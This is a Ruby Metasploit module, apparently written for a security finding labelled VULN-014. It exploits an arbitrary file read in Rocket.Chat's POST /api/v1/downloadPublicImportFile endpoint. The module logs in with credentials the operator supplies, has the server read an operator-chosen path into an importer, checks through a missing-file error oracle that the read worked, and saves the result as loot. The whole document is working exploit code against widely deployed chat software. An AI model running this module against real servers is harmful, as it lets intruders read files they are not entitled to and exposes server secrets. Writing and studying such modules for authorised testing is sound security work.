class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat downloadPublicImportFile arbitrary file read (VULN-014)',
        'Description' => %q{
          Rocket.Chat's POST /api/v1/downloadPublicImportFile reads an operator-named
          local path into the importer, bypassing any path restriction. This module
          signs in with the operator's credentials, has the server read FILEPATH into
          the IMPORTERKEY importer, and reports that the file was accepted; the bytes
          are then retrievable through getImportFileData. The operator sets FILEPATH;
          the module creates nothing. It is the existence oracle and arbitrary-read
          the finding describes.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/downloadPublicImportFile']),
      OptString.new('USERNAME', [true, 'A valid account on the target', '']),
      OptString.new('PASSWORD', [true, 'That account\'s password', '']),
      OptString.new('FILEPATH', [true, 'An absolute path on the server to read into the importer', '/etc/hostname']),
      OptString.new('ABSENTPATH', [true, 'A path that does not exist, for the existence-oracle control', '/etc/bs-no-such-file']),
      OptString.new('IMPORTERKEY', [true, 'The importer to feed the file to', 'csv']),
      OptString.new('TOTPCODE', [false, 'The current second-factor code, when the account given has one enrolled', ''])
    ])
  end

  # Sign in with credentials the operator already has. A module never
  # creates an account, seeds data, or changes state to make itself work.
  # Rocket.Chat answers POST /api/v1/login with a token pair rather than a
  # cookie, so the pair is what every later request carries. TOTPCODE is for
  # an account with a second factor enrolled: the operator supplies the
  # current code with the password, as they would in any other client.
  def authenticate
    creds = { 'user' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }
    creds['code'] = datastore['TOTPCODE'] unless datastore['TOTPCODE'].to_s.empty?
    2.times do |attempt|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(LOGIN_PATH),
        'ctype' => 'application/json',
        'data' => creds.to_json
      })
      if res && res.code == 200
        doc = parse_json(res)
        @auth_token = doc.dig('data', 'authToken')
        @user_id = doc.dig('data', 'userId')
        unless @auth_token.nil? || @user_id.nil?
          vprint_status("#{peer} - Signed in as #{datastore['USERNAME']} (user id #{@user_id})")
          return true
        end
      end
      sleep(2) if attempt.zero?   # ride out a transient per-route rate limit
    end
    false
  end

  def run
    unless authenticate
      fail_with(Failure::NoAccess, 'Could not sign in with the credentials given.')
    end

    res = import_path(datastore['FILEPATH'])
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = parse_json(res)['success'] == true && api_error(import_path(datastore['ABSENTPATH'])).include?('error-import-file-missing')
    fail_with(Failure::NotVulnerable, 'VULN-014: the attack did not land') unless hit

    print_good("#{peer} - VULN-014: exploited")
    print_good("#{peer} - server read '#{datastore['FILEPATH']}' into the #{datastore['IMPORTERKEY']} importer")
    print_status("  control '#{datastore['ABSENTPATH']}' -> #{api_error(import_path(datastore['ABSENTPATH']))} (the oracle echoes the path)")
    print_status('  the bytes are retrievable with GET /api/v1/getImportFileData')
    path = store_loot('blue_spider.vuln_014', 'text/plain', rhost, res.body.to_s, 'vuln_014.txt', 'VULN-014 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-014 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  def import_path(path)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'ctype' => 'application/json',
      'headers' => { 'X-Auth-Token' => @auth_token, 'X-User-Id' => @user_id,
                     'x-2fa-method' => 'password',
                     'x-2fa-code' => Digest::SHA256.hexdigest(datastore['PASSWORD']) },
      'data' => { 'fileUrl' => path, 'importerKey' => datastore['IMPORTERKEY'] }.to_json
    })
  end
end
